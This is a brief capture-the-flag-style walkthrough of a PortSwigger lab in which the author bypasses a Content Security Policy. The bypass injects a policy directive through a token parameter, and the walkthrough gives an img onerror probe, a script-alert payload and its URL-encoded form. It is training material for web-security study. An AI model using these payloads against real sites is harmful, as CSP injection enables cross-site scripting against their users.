## Welcome, my friend. Today we will start the [32. XSS lab](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass) in ```portswigger```
### Let's play this lab:

![image](https://github.com/user-attachments/assets/8d8c1539-bde3-45c9-96bc-cd200603e44e)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/02ad1f6e-17c2-4af2-82e9-af052f5d58e0)


### Here there html injection, Let's enter malicios code to discover XSS vulnerability:

```
<img src=1 onerror=alert(1)>
```

![image](https://github.com/user-attachments/assets/c354c93c-e58d-4174-b803-3ffd8a2dad5c)


### But this lab doesn't solved. Because there is CSP prevent this paylaod, So we will try escape from CSP:

```
token=;script-src-elem 'unsafe-inline'
```

### Our full payload :

```
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

### But we encoded to url encode:

```
%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

![image](https://github.com/user-attachments/assets/3f9bb3d3-b1bc-4f59-ba58-0a53d3d0c28d)


![image](https://github.com/user-attachments/assets/3e373247-ca5f-4288-a961-71a63016b51e)


-------

### Done! Congratulations, friends❤️‍🔥


<p align="center">
<img src="https://github.com/user-attachments/assets/c25cae8d-1ac9-4042-9bb2-8e28b6944ba2" >
</p>
